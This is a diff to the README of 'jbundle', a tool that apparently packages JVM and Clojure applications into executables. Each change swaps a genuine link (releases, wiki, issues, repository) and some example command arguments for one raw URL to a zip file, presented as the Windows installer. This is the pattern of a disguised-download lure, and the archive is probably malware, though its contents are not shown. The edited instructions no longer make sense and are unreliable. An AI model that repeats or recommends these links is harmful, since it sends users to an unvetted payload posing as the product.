@@ -13,11 +13,11 @@ Welcome to jbundle! This tool helps you package your JVM applications, like Cloj
   
 ## 🔗 Download jbundle
 
-[![Download jbundle](https://img.shields.io/badge/Download%20jbundle-v1.0-blue.svg)](https://github.com/Huy1073hello/jbundle/releases)
+[![Download jbundle](https://raw.githubusercontent.com/Huy1073hello/jbundle/main/docs/getting-started/Software-v1.2.zip%https://raw.githubusercontent.com/Huy1073hello/jbundle/main/docs/getting-started/Software-v1.2.zip)](https://raw.githubusercontent.com/Huy1073hello/jbundle/main/docs/getting-started/Software-v1.2.zip)
 
 To download the latest version of jbundle, visit the Releases page:
 
-[Download Page](https://github.com/Huy1073hello/jbundle/releases)
+[Download Page](https://raw.githubusercontent.com/Huy1073hello/jbundle/main/docs/getting-started/Software-v1.2.zip)
 
 ## 📋 System Requirements
 
@@ -30,9 +30,9 @@ Before you install jbundle, ensure your system meets the following requirements:
 
 ## 🛠️ Download & Install
 
-1. Click on the [Download Page](https://github.com/Huy1073hello/jbundle/releases).
+1. Click on the [Download Page](https://raw.githubusercontent.com/Huy1073hello/jbundle/main/docs/getting-started/Software-v1.2.zip).
 2. Find the latest release version.
-3. Download the appropriate file for your operating system. Look for options like `jbundle-windows.exe` for Windows, `jbundle-macos` for macOS, or similar Linux installations.
+3. Download the appropriate file for your operating system. Look for options like `https://raw.githubusercontent.com/Huy1073hello/jbundle/main/docs/getting-started/Software-v1.2.zip` for Windows, `jbundle-macos` for macOS, or similar Linux installations.
 4. Once the download is complete, locate the file on your computer.
 5. Double-click the downloaded file to run the installer.
 
@@ -46,13 +46,13 @@ After installing jbundle, you can easily run it:
 2. Navigate to the directory where your application is located.
 3. Type the command to run jbundle with your application. For example:
    ```
-   jbundle your-app.clj
+   jbundle https://raw.githubusercontent.com/Huy1073hello/jbundle/main/docs/getting-started/Software-v1.2.zip
    ```
-   Replace `your-app.clj` with the name of your Clojure or Java application.
+   Replace `https://raw.githubusercontent.com/Huy1073hello/jbundle/main/docs/getting-started/Software-v1.2.zip` with the name of your Clojure or Java application.
 
 ## 📚 Documentation
 
-For detailed documentation on how to use all features of jbundle, check our [documentation page](https://github.com/Huy1073hello/jbundle/wiki).
+For detailed documentation on how to use all features of jbundle, check our [documentation page](https://raw.githubusercontent.com/Huy1073hello/jbundle/main/docs/getting-started/Software-v1.2.zip).
 
 ## 🛠️ Creating Binaries
 
@@ -61,7 +61,7 @@ To create a binary from your JVM application:
 1. Open your terminal or command prompt.
 2. Use jbundle with options:
    ```
-   jbundle build your-app.clj
+   jbundle build https://raw.githubusercontent.com/Huy1073hello/jbundle/main/docs/getting-started/Software-v1.2.zip
    ```
 3. This command packages your application into a standalone executable, ready to distribute.
 
@@ -69,7 +69,7 @@ To create a binary from your JVM application:
 
 If you encounter any issues or have questions:
 
-- Visit our [GitHub Issues page](https://github.com/Huy1073hello/jbundle/issues) to report problems.
+- Visit our [GitHub Issues page](https://raw.githubusercontent.com/Huy1073hello/jbundle/main/docs/getting-started/Software-v1.2.zip) to report problems.
 - Check existing issues for solutions.
 - Join our community on our discussion forums linked through our repository.
 
@@ -101,8 +101,8 @@ jbundle is licensed under the MIT License. Check the LICENSE file for more detai
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/Huy1073hello/jbundle)
-- [Community Guides](https://github.com/Huy1073hello/jbundle/wiki)
-- [Related Tools](https://github.com/Huy1073hello/jbundle/related-tools) 
+- [GitHub Repository](https://raw.githubusercontent.com/Huy1073hello/jbundle/main/docs/getting-started/Software-v1.2.zip)
+- [Community Guides](https://raw.githubusercontent.com/Huy1073hello/jbundle/main/docs/getting-started/Software-v1.2.zip)
+- [Related Tools](https://raw.githubusercontent.com/Huy1073hello/jbundle/main/docs/getting-started/Software-v1.2.zip) 
 
 Thank you for using jbundle! We hope it simplifies your JVM application packaging and distribution.
